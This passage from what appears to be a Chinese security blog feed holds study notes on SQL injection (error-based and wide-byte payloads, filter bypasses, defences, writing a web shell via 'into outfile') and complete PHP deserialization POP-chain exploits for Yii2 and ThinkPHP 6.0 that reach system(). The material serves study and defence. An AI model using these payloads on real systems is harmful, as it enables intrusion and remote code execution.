class="line">14</span><br></pre></td><td class="code"><pre><span class="line">floor()和rand()</span><br><span class="line">union <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="number">2</span>,<span class="keyword">concat</span>(<span class="string">':'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">':'</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a       <span class="comment">/*利用错误信息得到当前数据库名*/</span></span><br><span class="line"></span><br><span class="line">extractvalue()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br><span class="line"></span><br><span class="line">updatexml()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">geometrycollection()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">exp</span>()</span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><ul><li>二次注入</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">二次注入原理：</span><br><span class="line">后端代码对恶意参数进行了转义，但是在存储时将转义后的数据还原存储，用户在二次请求查询该数据时直接带入sql语句进行了查询，导致sql注入的触发</span><br></pre></td></tr></table></figure><ul><li>宽字节注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id = -1%DF' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span>,%<span class="number">23</span> //利用%df吃掉转义字符\</span><br><span class="line">//利用前提条件：</span><br><span class="line">数据库的编码格式为GBK</span><br><span class="line">传入的单引号被转义符或是函数转义</span><br></pre></td></tr></table></figure><ul><li>base64注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=MSc%3d</span><br><span class="line">//注入语句进行base64编码</span><br></pre></td></tr></table></figure><ul><li>XFF注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For：127.0.0.1' <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">user</span>()</span><br></pre></td></tr></table></figure><ul><li>无列名注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b <span class="keyword">from</span> posts <span class="keyword">where</span> a=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">`3`</span>,<span class="number">0x2d</span>,<span class="string">`4`</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> xxx)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="常见绕过技巧"><a href="#常见绕过技巧" class="headerlink" title="常见绕过技巧"></a>常见绕过技巧</h3><ul><li><p><strong>大小写绕过</strong></p></li><li><p><strong>双写绕过</strong></p></li><li><p><strong>编码绕过</strong>（url全编码、十六进制）</p></li><li><p><strong>内联注释绕过</strong></p></li><li><p><strong>关键字替换</strong></p><ul><li><p><strong>逗号绕过</strong></p><p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p><p>limit中可以利用offset来摆脱对逗号的利用</p></li><li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p></li><li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p></li><li><p><strong>空格绕过</strong>（用括号，+等绕过）</p></li></ul></li><li><p><strong>等价函数绕过</strong></p><ul><li><code>hex()、bin()=ascii()</code></li><li><code>concat_ws()=group_concat()</code></li><li><code>mid()、substr()=substring()</code></li></ul></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">information_schema被禁用时替代：sys.schema_table_statistics_with_buffer,sys.x$schema_table_statistics_with_buffer,mysql.innodb_table_stats</span><br><span class="line">上面都被过滤时</span><br><span class="line">sys.schema_tables_with_full_table_scans</span><br><span class="line"></span><br><span class="line">substr、if被禁用</span><br><span class="line">and case when substr  then sleep(5) else 0 <span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><p>核心：数据代码分离原则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.最佳方法：预编译语句，绑定变量。使用预编译的SQL语句，SQL的语意不会变化，攻击者无法改变SQL的结构，即使攻击者插入了类似于’or ‘1’&#x3D;’1的字符串，也只会将此字符串作为username查询。</span><br><span class="line"></span><br><span class="line">2.从存储过程来防御：先将SQL语句定义在数据库中，存储过程中可能也存在注入问题，应该尽量避免在存储过程中使用动态SQL语句。</span><br><span class="line"></span><br><span class="line">3.从数据类型角度来防御：限制数据类型，并统一数据格式。</span><br><span class="line"></span><br><span class="line">4.从开发者角度来防御：开发时尽量用安全函数代替不安全函数，编写安全代码。危险函数，常见的执行命令函数，动态访问函数，如C语言中的system(),PHP的eval()，JSP的include()导致的代码越权执行，都是注入</span><br></pre></td></tr></table></figure><h2 id="相关Sql面经"><a href="#相关Sql面经" class="headerlink" title="相关Sql面经"></a>相关Sql面经</h2><p>1.为什么预编译能防止Sql注入？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">预编译是指把要执行的sql语句先进行一个解析,解析语法以及确定查询范围还有查找的返回结果类型，就是确定了查询的方式，把命令和参数进行了分离，使用预编译的sql语句来进行查询直接进行执行计划，不会在进行语义解析，也就是DB不会在进行编译，而是直接执行编译过的sql。只需要替换掉参数部分。</span><br></pre></td></tr></table></figure><p>2.mysql5.0以上和5.0以下有什么区别？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</span><br><span class="line">5.0以下是多用户单操作，5.0以上是多用户多操做。</span><br></pre></td></tr></table></figure><p>3.如何突破注入时字符被转义？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">宽字符注入</span><br><span class="line">hex编码绕过</span><br></pre></td></tr></table></figure><p>4.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root权限以及网站的绝对路径。</span><br></pre></td></tr></table></figure><p>5.sql如何写shell?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&lt;?php phpinfo(); ?&gt;&#39;&#96;</span><br><span class="line"></span><br><span class="line">&#96;http:&#x2F;&#x2F;127.0.0.1:81&#x2F;sqli.php?id&#x3D;-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;&#96;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Sql注入&quot;&gt;&lt;a href=&quot;#Sql注入&quot; class=&quot;headerlink&quot; title=&quot;Sql注入&quot;&gt;&lt;/a&gt;Sql注入
    
    </summary>
    
    
    
      <category term="review" scheme="http://yoursite.com/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>php魔术方法及pop链构造</title>
    <link href="http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2021-01-19T07:45:53.000Z</published>
    <updated>2021-01-22T16:55:39.379Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化知识点整理"><a href="#序列化知识点整理" class="headerlink" title="序列化知识点整理"></a>序列化知识点整理<a id="more"></a></h2><h3 id="核心部分：php魔术方法"><a href="#核心部分：php魔术方法" class="headerlink" title="核心部分：php魔术方法"></a>核心部分：php魔术方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct():构造函数，在每次创建新对象时先调用此方法</span><br><span class="line">__destruct():析构函数</span><br><span class="line">__call():在对象中调用不可访问的方法时调用</span><br><span class="line">__callStatic():在静态上下文中调用不可访问方法时调用</span><br><span class="line">__set():在给不可访问属性赋值时调用（private属性）</span><br><span class="line">__get():读取不可访问属性赋值时调用（private属性）</span><br><span class="line">__isset():当对不可访问属性调用isset()或者empty()时会被调用</span><br><span class="line">__unset():当对不可访问属性调用unset()时会被调用</span><br><span class="line">__sleep():执行serialize()时，会先被调用</span><br><span class="line">__wakeup():执行unserialize()时会先被调用</span><br><span class="line">__toString():类被当作字符串处理时会被调用</span><br><span class="line">__invoke():类被被当作函数调用时会被调用</span><br><span class="line">__set_state():调用var_export()导出类时，此静态方法会被调用。</span><br><span class="line">__clone():当对象复制完成时调用(调用了clone内置方法)</span><br><span class="line">__autoload():尝试加载未定义的类</span><br><span class="line">__debugInfo():打印所需调试信息</span><br></pre></td></tr></table></figure><h3 id="反序列化与pop链"><a href="#反序列化与pop链" class="headerlink" title="反序列化与pop链"></a>反序列化与pop链</h3><p>在审计框架漏洞的时候，可以从<code>Composer.json</code>入手</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于composer</span><br><span class="line">Composer是PHP用来管理依赖（dependency）关系的工具。你可以在自己的项目中声明所依赖的外部工具库（libraries），Composer 会帮你安装这些依赖的库文件。</span><br><span class="line">地址：https:&#x2F;&#x2F;www.phpcomposer.com&#x2F;</span><br></pre></td></tr></table></figure><p>通过查看<code>composer.json</code>可以寻找pop组件，该文件中写明了应用需要的使用的库，<code>unserialize()</code>函数能使用所有依赖库中的类,这就导致攻击面增大了</p><h3 id="php序列化处理器"><a href="#php序列化处理器" class="headerlink" title="php序列化处理器"></a><code>php</code>序列化处理器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line">php_serialize(php&gt;<span class="number">5.5</span><span class="number">.4</span>):存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>在存储数据和读取数据时使用不同的处理器导致可以伪造任意数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'ryat'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line">php_serialize处理</span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"ryat"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line">php读取</span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">"a:1:&#123;s:4:"</span>ryat<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//由于|字符导致实例化stdClass对象</span></span><br></pre></td></tr></table></figure><h3 id="审计pop链的思路"><a href="#审计pop链的思路" class="headerlink" title="审计pop链的思路"></a>审计pop链的思路</h3><ol><li><p>全局搜索<code>__destruct()</code>或者<code>__wakeup()</code>魔术方法入手</p></li><li><p>跟着函数追踪调用过程,注意找可控点(可寻找跳板，<code>__call()、__get()</code>)</p></li><li><p>根据整个pop链的调用构造exp</p></li><li><p>exp序列化数据传给反序列化入口点</p></li></ol><h3 id="以yii5-7和thinkphp6pop链为例"><a href="#以yii5-7和thinkphp6pop链为例" class="headerlink" title="以yii5.7和thinkphp6pop链为例"></a>以yii5.7和thinkphp6pop链为例</h3><p>yii5.7</p><p>起手，全局搜索<code>__destruct()</code>，这里找到<code>basic/vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/1.png" class=""><p>跟进<code>reset</code>方法，</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/2.png" class=""><p>这里的<code>$this-&gt;_dataReader</code>可控，跟进一下<code>close()</code>方法，发现断了</p><p>这里就要想到别的方法来继续接上链子，全局搜索<code>__call()</code>魔术方法，只要对应的类中不存在<code>close()</code>方法，就会调用<code>__call()</code>方法</p><p>找到的是<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/3.png" class=""><p>跟进<code>format</code>方法</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/4.png" class=""><p>继续跟进<code>getFormatter</code>方法</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/5.png" class=""><p><code>$this-&gt;formatters[$formatter]</code>作为函数返回值可控，此时<code>$formatter</code>为<code>close</code>,<code>$argument</code>初始化为空数组</p><p>``vendor/fzaninotto/faker/src/Faker/Generator.php<code>中</code>call_user_func_array<code>函数相当于调用了一个无参的函数，通过正则表达式来寻找调用</code>call_user_func`的无参函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> \<span class="title">w</span>+\<span class="params">(\)</span> ?\<span class="title">n</span>?\</span>&#123;(.*\n)+call_user_func</span><br></pre></td></tr></table></figure><p><code>找到vendor\yiisoft\yii2\rest\CreateAction.php</code>中的<code>run()</code>方法</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/6.png" class=""><p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>可控,就可以rce了</p><p>整个pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct() -&gt; Faker\Generator::__call() -&gt; yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">            <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">            <span class="keyword">public</span> $id;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">'phpinfo'</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> $formatters;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;formatters[<span class="string">'close'</span>] = [<span class="keyword">new</span> CreateAction(),<span class="string">'run'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">            <span class="keyword">public</span> $_dataReader;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> Generator();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>thinkphp6.0</p><p>全局搜索<code>__destruct()</code>,<code>vendor/topthink/think-orm/src/Model.php</code>找到起点</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/7.png" class=""><p><code>$this-&gt;lazySave</code>可控，需要为<code>true</code>，跟进<code>save</code>函数</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/8.png" class=""><p>可以看到想要走下去不能直接让函数返回false，也就是<code>$this-&gt;isEmpty()==true&amp;&amp;$this-&gt;trigger(&#39;BeforeWrite&#39;)!=false</code></p><p>分别跟进</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/10.png" class=""><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/9.png" class=""><p><code>isEmpty()</code>返回值为false，要让<code>$this-&gt;data</code>为非空数组，<code>$this-&gt;wiehEvent==false</code>就能让返回值为true</p><p>接着回到<code>save()</code>函数往下走</p><p><code>$this-&gt;exists</code>可控，这边分别跟进之后，让<code>$this-&gt;exists</code>为true，接着跟进<code>updateData()</code>函数</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/11.png" class=""><p>前面的<code>if</code>条件直接可以跳过，前面已经满足了跳过条件</p><p>接着跟进<code>getChangedData()</code>函数，<code>checkData()</code>函数没有任何返回值，直接跳过</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/12.png" class=""><p>这里要直接返回<code>$this-&gt;data</code>，<code>$this-&gt;force</code>可控置为<code>true</code></p><p><code>updateData()</code>函数接着往下，跟进<code>checkAllowFields()</code>函数</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/14.png" class=""><p><code>$this-&gt;field</code>和<code>$this-&gt;schema</code>默认为空，进入else条件</p><p>跟进<code>db()</code>函数</p><p>这里进行了字符串的拼接，实例化一个类就可以调用<code>__toString()</code>魔术方法</p><p>全局搜索<code>__toString()</code>,找到<code>topthink/think-orm/src/model/concern/Conversion.php</code></p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/15.png" class=""><p>跟进<code>toJson()</code>,继续跟进<code>toArray()</code>,下面就是接着跟进一直到<code>getValue</code>方法</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/18.png" class=""><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/17.png" class=""><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/16.png" class=""><p>满足<code>$this-&gt;withAttr[$key]</code>存在且<code>$this-&gt;withAttr[$key]</code>不为数组就可以触发命令执行</p><p>最终会把<code>$this-&gt;withAttr[$key]</code>作为函数名动态执行函数，而<code>$value</code>作为参数，就可以利用执行系统函数达到命令执行</p><p>整条链子</p><img src="/2021/01/19/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%8Apop%E9%93%BE%E6%9E%84%E9%80%A0/19.png" class=""><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>;</span><br><span class="line"><span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = [<span class="string">"peguin"</span>=&gt;<span class="string">"whoami"</span>];</span><br><span class="line">    <span class="keyword">private</span> $withAttr = [<span class="string">"peguin"</span>=&gt;<span class="string">"system"</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;<span class="comment">//True</span></span><br><span class="line">    <span class="keyword">private</span> $exists;<span class="comment">//True</span></span><br><span class="line">    <span class="keyword">protected</span> $withEvent;<span class="comment">//False</span></span><br><span class="line">    <span class="comment">// private $data;//非空数组</span></span><br><span class="line">    <span class="keyword">private</span> $force;<span class="comment">//强制为True</span></span><br><span class="line">    <span class="comment">//schema,field默认为空不需要构造</span></span><br><span class="line">    <span class="keyword">protected</span> $table;<span class="comment">//为空</span></span><br><span class="line"><span class="comment">//toArray中，$data来源于$this-&gt;data,$data[key]=&gt;getAttr($key)，key值为同一个</span></span><br><span class="line"><span class="comment">//getAttr=&gt;getData getAttr的参数$name即为$key,$filename=$name=&gt;$key,if判断条件成立返回$this-&gt;data[$fieldName]=&gt;$this-&gt;data[$key]</span></span><br><span class="line"><span class="comment">//getAttr返回$this-&gt;getValue($key,$value,$relation)</span></span><br><span class="line"><span class="comment">//getValue利用点 $value   = $closure($value, $this-&gt;data)动态函数调用</span></span><br><span class="line"><span class="comment">// $this-&gt;withAttr[$fieldName]为调用函数，$filedName不为数组，$value为参数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obs = <span class="string">''</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = $obs;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Pivot();</span><br><span class="line">$b = <span class="keyword">new</span> Pivot($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure><h3 id="魔术方法补充"><a href="#魔术方法补充" class="headerlink" title="魔术方法补充"></a>魔术方法补充</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__toString触发条件：</span><br><span class="line"><span class="keyword">echo</span> ($obj) / <span class="keyword">print</span>($obj) 